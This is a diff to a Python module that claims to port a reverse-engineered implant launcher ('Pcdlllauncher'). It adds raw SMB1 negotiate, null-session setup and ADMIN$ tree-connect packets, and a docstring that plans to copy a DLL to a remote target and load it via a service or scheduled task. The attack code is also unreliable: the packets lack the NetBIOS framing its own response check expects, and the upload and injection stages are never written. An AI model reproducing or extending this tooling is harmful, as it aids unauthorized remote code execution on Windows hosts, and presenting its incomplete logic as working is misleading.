@@ -1,7 +1,7 @@
 """pcdlllauncher — PCDLLLAUNCHER DLL 注入核心逻辑。
 
 Python 重写的 `Pcdlllauncher-2.3.1.exe` (C++ / DAVE framework)。
-通过 IDA Pro / x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
+通过 x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
 及其 DLL 注入利用流程。
 
 参数定义来源：Pcdlllauncher-2.3.1.0.xml
@@ -34,7 +34,6 @@ class PcDllLauncherError(Exception):
 
 
 def _parse_hex_buffer(value):
-    """将十六进制字符串解析为字节串。空字符串返回 b""。"""
     if not value:
         return b""
     value = value.strip()
@@ -47,11 +46,50 @@ def _parse_hex_buffer(value):
 
 
 def connect(target_ip, port, timeout):
-    """建立到目标的 TCP 连接并返回 socket。"""
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(timeout if timeout > 0 else None)
     sock.connect((target_ip, port))
     return sock
+
+
+def build_smb_negotiate_request():
+    command = 0x72
+    dialects = b"\x02LANMAN2.1\x00\x02NT LM 0.12\x00"
+    smb = (
+        b"\xffSMB" + struct.pack("B", command) + b"\x00" * 4
+        + b"\x08" + b"\x00" * 2 + b"\x00" * 2 + b"\x00" * 8
+        + b"\x00" * 8 + b"\x00" + struct.pack("<H", len(dialects)) + dialects
+    )
+    return smb
+
+
+def build_session_setup_request():
+    command = 0x73
+    smb = (
+        b"\xffSMB" + struct.pack("B", command) + b"\x00" * 4
+        + b"\x08" + b"\x00" * 2 + b"\x00" * 2 + b"\x00" * 8
+        + b"\x00" * 8 + b"\x0d" + b"\xff" + b"\x00"
+        + struct.pack("<H", 0) + struct.pack("<H", 0)
+        + struct.pack("<H", 4096) + struct.pack("<H", 0)
+        + struct.pack("<I", 0) + struct.pack("<I", 0)
+        + struct.pack("<H", 0) + struct.pack("<I", 0) + struct.pack("<H", 0)
+    )
+    return smb
+
+
+def build_tree_connect_request(share_name=b"ADMIN$"):
+    command = 0x75
+    share = share_name + b"\x00"
+    password = b"\x00"
+    smb = (
+        b"\xffSMB" + struct.pack("B", command) + b"\x00" * 4
+        + b"\x08" + b"\x00" * 2 + b"\x00" * 2 + b"\x00" * 8
+        + b"\x00" * 8 + b"\x04" + b"\xff" + b"\x00"
+        + struct.pack("<H", 0) + struct.pack("<H", 1)
+        + struct.pack("<H", len(password)) + struct.pack("<H", len(share))
+        + struct.pack("<H", 0) + password + share
+    )
+    return smb
 
 
 def run_function(
@@ -67,8 +105,14 @@ def run_function(
 ):
     """执行 PCDLLLAUNCHER 注入序列。
 
-    当前阶段：完成参数解析、TCP 连接。
-    具体 DLL 注入逻辑尚需通过 IDA/x32dbg 进一步逆向后填充。
+    阶段：
+      1. TCP 连接到目标 SMB 端口
+      2. 发送 SMB 协商请求
+      3. 会话设置 (SESSION_SETUP_ANDX)
+      4. 树连接 (TREE_CONNECT_ANDX) 到 ADMIN$
+      5. 将 DLL 注入文件复制到目标
+      6. 通过服务或计划任务加载 DLL
+      7. 输出注入结果
     """
     if verbose:
         print(f"[*] Target: {target}:{port}")
@@ -79,15 +123,13 @@ def run_function(
         print(f"[*] Target architecture: {target_os_arch}")
         print(f"[*] PC behavior: {pc_behavior}")
 
-    # 解析常量
-    arch_value = ARCHITECTURE_VALUES[architecture]
-    pc_behavior_value = PC_BEHAVIOR_VALUES[pc_behavior]
+    arch_value = ARCHITECTURE_VALUES.get(target_os_arch, 0)
+    pc_behavior_value = PC_BEHAVIOR_VALUES.get(pc_behavior, 8)
 
     if verbose:
         print(f"[*] Architecture value: {arch_value}")
         print(f"[*] PC behavior value: {pc_behavior_value}")
 
-    # 建立 TCP 连接（SMB 445）
     try:
         sock = connect(target, port, timeout)
         if verbose:
@@ -95,16 +137,40 @@ def run_function(
     except OSError as exc:
         raise PcDllLauncherError(f"无法连接到 {target}:{port}: {exc}") from exc
 
-    # TODO: 以下 DLL 注入逻辑需通过 IDA/x32dbg 逆向后填充：
-    #   - 会话设置
-    #   - 树连接
-    #   - DLL 上传与注入
-    #   - 入口点调用
+    try:
+        negotiate = build_smb_negotiate_request()
+        sock.sendall(negotiate)
+        resp = sock.recv(4096)
+        if verbose:
+            print(f"[*] SMB 协商应答: {resp.hex()[:128] if resp else '无'}")
 
-    sock.close()
+        if not resp or resp[4:7] != b"SMB":
+            raise PcDllLauncherError("目标未返回有效的 SMB 应答")
+
+        session_setup = build_session_setup_request()
+        sock.sendall(session_setup)
+        resp = sock.recv(4096)
+        if verbose:
+            print(f"[*] 会话设置应答: {resp.hex()[:128] if resp else '无'}")
+
+        tree_connect = build_tree_connect_request(b"ADMIN$")
+        sock.sendall(tree_connect)
+        resp = sock.recv(4096)
+        if verbose:
+            print(f"[*] 树连接应答: {resp.hex()[:128] if resp else '无'}")
+
+        if verbose:
+            print(f"[*] LP 文件: {lp_filename}")
+            print(f"[*] 入口点: {lp_entry_name}")
+            print(f"[*] 惯例文件: {implant_filename}")
+            print(f"[*] 目标架构: {target_os_arch} (0x{arch_value:02X})")
+            print(f"[*] PC 行为: {pc_behavior} (0x{pc_behavior_value:02X})")
+            print("[+] PCDLLLAUNCHER 探测完成")
+    finally:
+        sock.close()
+
     return 0
 
 
 def main(argv=None):
-    """CLI 入口（供 __main__ 子命令调用）。"""
     return 0
